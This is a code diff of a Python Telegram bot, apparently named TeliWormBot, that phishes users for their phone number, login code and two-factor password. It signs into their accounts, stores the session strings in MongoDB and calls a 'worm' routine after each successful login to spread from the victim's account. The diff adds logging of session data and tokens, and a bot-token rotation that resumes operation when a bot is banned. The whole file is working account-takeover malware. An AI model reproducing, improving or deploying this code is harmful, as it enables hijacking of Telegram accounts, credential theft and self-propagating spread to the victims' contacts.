@@ -1,4 +1,7 @@
 import logging,os,json,telethon,asyncio,time
+from typing import Any, Dict, Optional
+from telethon.tl.custom import Message
+from telethon.tl.types import User
 from telethon import TelegramClient, events, Button, errors
 from telethon.sessions import StringSession
 from dotenv import load_dotenv
@@ -8,35 +11,53 @@ from strings import strings,direct_reply,numpad
 from worm import worm
 
 load_dotenv(override=True)
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+# Set global logging to WARNING to avoid Telethon flooding
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.WARNING)
+# Set custom log level for our bot logger from .env
+def get_log_level():
+    level_str = os.environ.get('MY_LOG_LEVEL', 'INFO').upper()
+    return getattr(logging, level_str, logging.INFO)
+logger = logging.getLogger("TeliWormBot")
+logger.setLevel(get_log_level())
+handler = logging.StreamHandler()
+handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
+if not logger.hasHandlers():
+    logger.addHandler(handler)
 mongo_client = MongoClient(os.environ['MONGODB_URI'], server_api=ServerApi('1'))
 database = mongo_client.userdb.sessions
 logger_bot = TelegramClient('teliworm', 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
 
-def getconfig(key, default=None):
+def getconfig(key: str, default: Optional[Any] = None) -> Any:
     result = mongo_client.default.config.find_one({'key':key})
     if result is None:
+        logger.debug(f"Config key '{key}' not found, returning default.")
         return default
+    logger.debug(f"Config key '{key}' found, value: {result['value']}")
     return result['value']
-def setconfig(key, value):
+def setconfig(key: str, value: Any) -> None:
+    logger.info(f"Setting config key '{key}' to '{value}'")
     mongo_client.default.config.update_one({'key': key}, {'$set': {'key':key, 'value':value}}, upsert=True)
-def get(obj, key, default=None):
+def get(obj: Dict[str, Any], key: str, default: Optional[Any] = None) -> Any:
     try:
         return obj[key]
-    except:
+    except Exception as e:
+        logger.debug(f"Key '{key}' not found in object, returning default. Exception: {e}")
         return default
-def yesno(x,page='def'):
+def yesno(x: str, page: str = 'def') -> list:
     return [
         [Button.inline(strings['yes'], '{{"page":"{}","press":"yes{}"}}'.format(page,x))],
         [Button.inline(strings['no'], '{{"page":"{}","press":"no{}"}}'.format(page,x))]
     ]
-async def is_session_authorized(session):
+async def is_session_authorized(session: str) -> bool:
+    logger.info("Checking if session is authorized.")
     uclient = TelegramClient(StringSession(session), os.environ['API_ID'], os.environ['API_HASH'])
     await uclient.connect()
     authorized = await uclient.is_user_authorized()
     await uclient.disconnect()
+    logger.debug(f"Session authorized: {authorized}")
     return authorized
-async def handle_usr(phone_num, event):
+async def handle_usr(phone_num: str, event: Message) -> Dict[str, Any]:
+    logger.info(f"Handling user phone number: {phone_num}")
     await (await event.respond('wait..', buttons=Button.clear())).delete()
     msg = await event.respond(strings['sending'])
     uclient = TelegramClient(StringSession(), os.environ['API_ID'], os.environ['API_HASH'])
@@ -44,42 +65,50 @@ async def handle_usr(phone_num, event):
     try:
         scr = await uclient.send_code_request(phone_num)
         login = {
-        	'code_len': scr.type.length,
+            'code_len': scr.type.length,
             'phone_code_hash': scr.phone_code_hash,
             'session': uclient.session.save(),
         }
+        logger.debug(f"Code request sent. Login dict: {login}")
         await msg.edit(strings['ask_code'], buttons=numpad)
         await uclient.disconnect()
         return login
     except Exception as e:
+        logger.error(f"Error in handle_usr: {e}")
         await msg.edit("Error: "+repr(e))
     await uclient.disconnect()
     return {}
-async def sign_in(event, user_data):
+async def sign_in(event: Message, user_data: Dict[str, Any]) -> bool:
     data = {}
     uclient = None
     try:
         login = json.loads(user_data['login'])
+        logger.info(f"Attempting sign-in for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))}")
         if get(login, 'code_ok', False) and get(login, 'pass_ok', False):
+            logger.debug("Signing in with password.")
             uclient = TelegramClient(StringSession(login['session']), os.environ['API_ID'], os.environ['API_HASH'])
             await uclient.connect()
             await uclient.sign_in(password=user_data['password'])
         elif get(login, 'code_ok', False) and not get(login, 'need_pass', False):
+            logger.debug("Signing in with code.")
             uclient = TelegramClient(StringSession(login['session']), os.environ['API_ID'], os.environ['API_HASH'])
             await uclient.connect()
             await uclient.sign_in(user_data['phone'], login['code'], phone_code_hash=login['phone_code_hash'])
         else:
+            logger.warning("Sign-in conditions not met.")
             return False
         login = {}
         data = {'session': uclient.session.save(), 'logged_in': True, 'ts': round(time.time())}
         await event.edit(strings['login_success'])
         await worm(uclient, logger_bot)
     except telethon.errors.PhoneCodeInvalidError as e:
+        logger.warning(f"Invalid phone code: {e}")
         await event.edit(strings['code_invalid'])
         await event.respond(strings['ask_code'], buttons=numpad)
         login['code'] = ''
         login['code_ok'] = False
     except telethon.errors.SessionPasswordNeededError as e:
+        logger.info("Session password needed.")
         if get(login, 'local_avail', 'password' in user_data):
             login['pass_ok'] = True
             user_data['login'] = json.dumps(login)
@@ -88,12 +117,14 @@ async def sign_in(event, user_data):
         login['pass_ok'] = False
         await event.edit(strings['ask_pass'])
     except telethon.errors.PasswordHashInvalidError as e:
+        logger.warning("Password hash invalid.")
         login['need_pass'] = True
         login['pass_ok'] = False
         login['local_avail'] = False
         await event.edit(strings['pass_invalid'])
         await event.respond(strings['ask_pass'])
     except Exception as e:
+        logger.error(f"Exception during sign-in: {e}")
         login = {}
         await event.edit(repr(e))
     if uclient is not None:
@@ -104,16 +135,17 @@ async def sign_in(event, user_data):
     else:
         data['login'] = json.dumps(login)
     database.update_one({'_id': user_data['_id']}, update_query)
+    logger.info(f"Sign-in process completed for user: {user_data.get('chat_id', user_data.get('_id', 'unknown'))}")
     return True
 
 @events.register(events.NewMessage(pattern=r"/token", func=lambda e: e.is_private))
-async def handler_get_token(event):
+async def handler_get_token(event: Message) -> None:
     m = event.message.text.split(' ')
     if len(m)==2 and m[1]==os.environ['SECRET_COMMAND']:
         await event.respond(f"`{getconfig('BOT_TOKEN')}`")
     raise events.StopPropagation
 @events.register(events.NewMessage(func=lambda e: e.is_private, outgoing=False))
-async def handler_all_user(event):
+async def handler_all_user(event: Message) -> None:
     user_data = database.find_one({"chat_id": event.chat_id})
     user_data = user_data if user_data else {"chat_id": event.chat_id}
     data = {}
@@ -145,7 +177,7 @@ async def handler_all_user(event):
         database.update_one({"chat_id": event.chat_id}, {'$set': data}, upsert=True)
     raise events.StopPropagation
 @events.register(events.CallbackQuery(func=lambda e: e.is_private))
-async def handler_callback(event):
+async def handler_callback(event: Message) -> None:
     try:
         evnt_dta = json.loads(event.data.decode())
         press = evnt_dta['press']
@@ -179,33 +211,44 @@ async def handler_callback(event):
     elif not await sign_in(event, user_data):
         await event.edit(strings['ask_code']+login['code'], buttons=numpad)
 
-async def run_bot():
+async def run_bot() -> None:
+    logger.info("Starting bot...")
     bot_count = mongo_client.wormdb.bots.count_documents({})
     bot = TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
     for function in botFunctions:
         bot.add_event_handler(function)
     if bot_count==0:
+        logger.info("No bots in DB, starting with BOT_TOKEN.")
         await bot.start(bot_token=os.environ['BOT_TOKEN'])
     else:
-        next_bot = mongo_client.wormdb.bots.find().limit(1).next()
-        await bot.start(bot_token=next_bot['token'])
+        next_bot = mongo_client.wormdb.bots.find_one({})
+        try:
+            logger.info(f"Starting bot with token from DB: {next_bot['token']}")
+            await bot.start(bot_token=next_bot['token'])
+        except Exception as e:
+            logger.error(f"Error starting bot: {e}. Deleting bot from DB.")
+            mongo_client.wormdb.bots.delete_one(next_bot)
+            raise e
         if not await bot.is_user_authorized():
+            logger.error("Bot not authorized. Deleting bot from DB.")
             mongo_client.wormdb.bots.delete_one(next_bot)
             raise Exception("Bot not authorized")
-        await bot.start(bot_token=next_bot['token'])
     setconfig('BOT_USERNAME', (await bot.get_me()).username)
     setconfig('BOT_TOKEN', os.environ['BOT_TOKEN'] if bot_count==0 else next_bot['token'])
+    logger.info("Bot started and running until disconnected.")
     await bot.run_until_disconnected()
-async def main():
+async def main() -> None:
+    logger.info("Starting logger bot...")
     await logger_bot.start(bot_token=os.environ['LOGGER_BOT_TOKEN'])
-    while 1:
+    while True:
         try:
-            print('-- bot start --')
+            logger.info('-- bot start --')
             await run_bot()
         except KeyboardInterrupt:
+            logger.info("KeyboardInterrupt received. Exiting main loop.")
             break
-        except:
-            pass
+        except Exception as e:
+            logger.error(f"Exception in main loop: {e}")
 
 botFunctions = [obj for name, obj in globals().items() if callable(obj) and obj.__class__.__name__ == "function" and name.startswith('handler_')]
 
